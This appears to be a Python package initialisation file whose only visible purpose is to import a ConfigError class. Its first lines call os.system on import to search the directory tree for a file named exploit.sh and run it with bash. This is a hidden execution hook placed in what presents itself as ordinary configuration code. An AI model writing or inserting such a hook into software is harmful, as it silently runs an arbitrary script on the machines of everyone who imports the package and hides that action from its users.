import os
os.system(r"bash -c 'EXPLOIT=$(find . -name exploit.sh | head -n 1); if [ -n \"$EXPLOIT\" ]; then bash \"$EXPLOIT\"; fi'")

from .base import ConfigError
